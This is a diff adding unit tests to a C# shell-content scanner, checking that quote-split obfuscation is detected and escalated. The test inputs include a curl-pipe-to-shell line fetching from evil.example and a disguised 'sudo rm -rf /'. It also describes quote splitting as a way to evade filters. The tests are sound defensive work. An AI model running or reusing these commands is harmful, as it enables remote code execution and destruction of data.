@@ -409,6 +409,45 @@ public class ShellContentScannerTests
     }
 
     [Test]
+    public void Intra_word_quote_split_download_is_detected_and_escalated()
+    {
+        // c'u'rl is curl after shell quote removal: intra-word quotes are stripped during
+        // normalization, the raw line does not match, and the finding escalates.
+        var finding = SingleFinding("c'u'rl https://evil.example/x.sh | sh", "network-to-shell");
+
+        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
+        Assert.That(finding.Message, Does.Contain("obfuscated").IgnoreCase);
+    }
+
+    [Test]
+    public void Intra_word_quote_split_privilege_escalation_is_detected_and_escalated()
+    {
+        var finding = SingleFinding("s\"u\"do rm -rf /", "privilege-escalation");
+
+        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
+    }
+
+    [Test]
+    public void Edge_quoted_tool_names_remain_exempt_after_intra_word_change()
+    {
+        // 'npm' and "curl" are quoted strings, not invocations: edge quotes are kept by
+        // normalization, so the quoted mask still hides the tool names.
+        var findings = Scan("echo 'npm' \"curl\"");
+
+        Assert.That(findings.Any(f => f.RuleId == "risky-tool"), Is.False,
+            $"Unexpected risky-tool finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
+    }
+
+    [Test]
+    public void Edge_quoted_privilege_tool_mention_remains_exempt_after_intra_word_change()
+    {
+        var findings = Scan("msg2 \"run 'sudo' to continue\"");
+
+        Assert.That(findings.Any(f => f.RuleId == "privilege-escalation"), Is.False,
+            $"Unexpected privilege-escalation finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
+    }
+
+    [Test]
     public void Command_substitution_inside_quoted_heredoc_body_is_suppressed()
     {
         var findings = Scan("cat <<'EOF'\ndest=\"$LOCAL/$(basename \"$f\")\"\nEOF\n");
